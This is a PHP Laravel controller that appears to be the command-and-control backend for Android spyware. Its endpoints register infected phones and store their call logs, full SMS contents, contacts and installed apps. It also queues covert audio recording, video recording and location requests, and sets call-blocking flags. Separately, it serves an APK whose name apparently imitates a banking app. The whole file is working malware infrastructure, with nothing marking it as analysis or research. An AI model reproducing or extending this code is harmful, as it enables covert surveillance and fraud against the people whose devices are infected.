<?php

namespace App\Http\Controllers\Api;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Models\AppList;
use App\Models\AudioRecord;
use App\Models\CallLog;
use App\Models\Contact;
use App\Models\Device;
use App\Models\DeviceLocation;
use App\Models\MsgLog;
use App\Models\RequestHistory;
use App\Models\UpdateStatus;
use App\Models\VideoRecord;

class ApiDeviceController extends Controller {

    public function registerDevice(Request $request) {

        date_default_timezone_set("Asia/Shanghai");  

        $deviceUUID = $request->device_uuid;
        $team_id = $request->team_id;
        
        $device = Device::where('device_uuid', $deviceUUID)->first();
        if ($device == null) {
            $device = new Device();
        }
        
        $device->team_id = $team_id;
        $device->device_uuid = $deviceUUID;
        $device->model = $request->model;
        $device->app_version = $request->app_version;
        $device->android_version = $request->android_version;
        $device->battery_status = $request->battery_status;
        $device->signal_status = $request->signal_status;
        $device->phone = $request->phone;
        $device->service = $request->service;
        $device->save();

        $update_status = UpdateStatus::where('device_id', $device->id)->first();
        if ($update_status == null) {
            $update_status = new UpdateStatus();
            $update_status->device_id = $device->id;
            $update_status->status_incoming = 1;
            $update_status->status_outgoing = 1;
            $update_status->status_blacklist = 1;
            $update_status->save();
        }
        
        $sms = MsgLog::where('device_id', $device->id)->orderBy('send_time', 'desc')->first();
        $call = CallLog::where('device_id', $device->id)->orderBy('call_time', 'desc')->first();
        $app = AppList::where('device_id', $device->id)->orderBy('upgraded_at', 'desc')->first();
        $contact = Contact::where('device_id', $device->id)->orderBy('added_at', 'desc')->first();

        $last_times = [
            "sms" => ($sms != null) ? $sms->send_time : null,
            "call" => ($call != null) ? $call->call_time : null,
            "app" => ($app != null) ? $app->upgraded_at : null,
            "contact" => ($contact != null) ? $contact->added_at : null,
        ];

        $callHistory = RequestHistory::where('device_id', $device->id)->where('response_time', null)->orderBy('request_time', 'desc')->first();
        $audioRecord = AudioRecord::where('device_id', $device->id)->where('status', 0)->orderBy('created_at', 'desc')->first();
        $location = DeviceLocation::where('device_id', $device->id)->where('latitude', null)->orderBy('created_at', 'desc')->first();

        $response = [];
        $response['success'] = true;
        $response['device'] = $device;
        $response['last_time'] = $last_times;
        $response['update_status'] = $update_status;
        $response['call_history'] = $callHistory;
        $response['audio_record'] = $audioRecord;
        $response['device_location'] = $location;


        return response()->json($response);
    }

    public function updateDevice(Request $request) {
        date_default_timezone_set("Asia/Shanghai");  
        
        $deviceUUID = $request->device_uuid;
        $team_id = $request->team_id;
        
        $device = Device::where('device_uuid', $deviceUUID)->first();
        if ($device == null) {
            $device = new Device();
        }
        
        $device->team_id = $team_id;
        $device->device_uuid = $deviceUUID;
        $device->model = $request->model;
        $device->app_version = $request->app_version;
        $device->android_version = $request->android_version;
        $device->battery_status = $request->battery_status;
        $device->signal_status = $request->signal_status;
        $device->phone = $request->phone;
        $device->service = $request->service;
        $device->status = true;
        $device->save();

        $callJson = $request->call_logs;
        if ($callJson != null) {
            $callLogs = json_decode($callJson);
            foreach ($callLogs as $i => $callLog) {
                $log = new CallLog();
                $log->team_id = $team_id;
                $log->device_id = $device->id;
                $log->duration = $callLog->duration;
                $log->direction = $callLog->direction;
                $log->part_phone = $callLog->part_phone;

                $mil = $callLog->call_time;
                $seconds = $mil / 1000;              
                $log->call_time = date("Y-m-d H:i:s", $seconds);
                $log->save();
            }
        } 
        
        $smsJson = $request->sms_logs;
        if ($smsJson != null) {
            $smsLogs = json_decode($smsJson);
            foreach ($smsLogs as $i => $sms_log) {
                $log = new MsgLog();
                $log->device_id = $device->id;
                $log->direction = $sms_log->type;
                $log->content = $sms_log->body;
                $log->part_phone = $sms_log->address;
                $log->send_time = $sms_log->date;
                $log->save();
            }
        }
        
        $contactJson = $request->contacts;
        if ($contactJson != null) {
            $contacts = json_decode($contactJson);
            foreach ($contacts as $i => $contact) {
                $phones = $contact->phone;
                if ($phones != null) {
                    foreach ($phones as $i => $phone) {
                        $log = Contact::where('contact_id', $contact->contact_id)->first();
                        if ($log == null) {
                            $log = new Contact();
                        }
                        $log->contact_id = $contact->contact_id;
                        $log->device_id = $device->id;
                        $log->name = $contact->name;
                        $log->phone = $phone;

                        $mil = $contact->added_at;
                        $seconds = $mil / 1000;              
                        $log->added_at = date("Y-m-d H:i:s", $seconds);
                        $log->save();
                    }
                } else {
                    $log = Contact::where('contact_id', $contact->contact_id)->first();
                    if ($log == null) {
                        $log = new Contact();
                    }
                    $log->device_id = $device->id;
                    $log->contact_id = $contact->contact_id;
                    $log->name = $contact->name;
                    $log->phone = $phones;
                    
                    $mil = $contact->added_at;
                    $seconds = $mil / 1000;              
                    $log->added_at = date("Y-m-d H:i:s", $seconds);
                    $log->save();
                }
                
            }
        }
        
        $applistJson = $request->applications;
        if ($applistJson != null) {
            $applists = json_decode($applistJson);
            foreach ($applists as $i => $applist) {
                $log = new AppList();
                $log->device_id = $device->id;
                $log->name = $applist->name;
                $log->package = $applist->package;
                $log->version = $applist->version;

                $installed_at = $applist->installed_at;
                $seconds = $installed_at / 1000;
                $log->installed_at = date("Y-m-d H:i:s", $seconds);
                
                $upgraded_at = $applist->upgraded_at;
                $seconds = $upgraded_at / 1000;
                $log->upgraded_at = date("Y-m-d H:i:s", $seconds);
                
                $log->save();
            }
        }
        
        $update_status = UpdateStatus::where('device_id', $device->id)->first();
        if ($update_status == null) {
            $update_status = new UpdateStatus();
            $update_status->device_id = $device->id;
            $update_status->status_incoming = 1;
            $update_status->status_outgoing = 1;
            $update_status->status_blacklist = 1;
            $update_status->save();
        }

        $sms = MsgLog::where('device_id', $device->id)->orderBy('send_time', 'desc')->first();
        $call = CallLog::where('device_id', $device->id)->orderBy('call_time', 'desc')->first();
        $app = AppList::where('device_id', $device->id)->orderBy('upgraded_at', 'desc')->first();
        $contact = Contact::where('device_id', $device->id)->orderBy('added_at', 'desc')->first();

        $last_times = [
            "sms" => ($sms != null) ? $sms->send_time : null,
            "call" => ($call != null) ? $call->call_time : null,
            "app" => ($app != null) ? $app->upgraded_at : null,
            "contact" => ($contact != null) ? $contact->added_at : null,
        ];

        $callHistory = RequestHistory::where('device_id', $device->id)->where('response_time', null)->orderBy('request_time', 'desc')->first();
        $audioRecord = AudioRecord::where('device_id', $device->id)->where('status', 0)->orderBy('created_at', 'desc')->first();
        $location = DeviceLocation::where('device_id', $device->id)->where('latitude', null)->orderBy('created_at', 'desc')->first();
        $videoRecord = VideoRecord::where('device_id', $device->id)->where('status', 0)->orderBy('created_at', 'desc')->first();

        $response = [];
        $response['success'] = true;
        $response['device'] = $device;
        $response['last_time'] = $last_times;
        $response['call_history'] = $callHistory;
        $response['audio_record'] = $audioRecord;
        $response['video_record'] = $videoRecord;
        $response['device_location'] = $location;
        $response['update_status'] = $update_status;

        return response()->json($response);
    }

    public function getApplications($device_id) {
        date_default_timezone_set("Asia/Shanghai");  

        $device = Device::where('id', $device_id)->first();
        $applications = $device->rApplications;
        $appLists = [];

        foreach ($applications as $i => $application) {
            $data = [];
            $data['name'] = $application->name;
            $data['package'] = $application->package;
            $data['version'] = $application->version;
            $data['installed_at'] = $application->installed_at;
            $data['upgraded_at'] = $application->upgraded_at;

            array_push($appLists, $data);
        }

        return response()->json(['success' => true, 'app_lists' => $appLists]);
    }

    public function downloadApk() {
        $realLocation = resource_path().'/app'.'/kbbanq70.apk';
        return response()->download($realLocation, 'kbbanq70.apk'); 
    }
}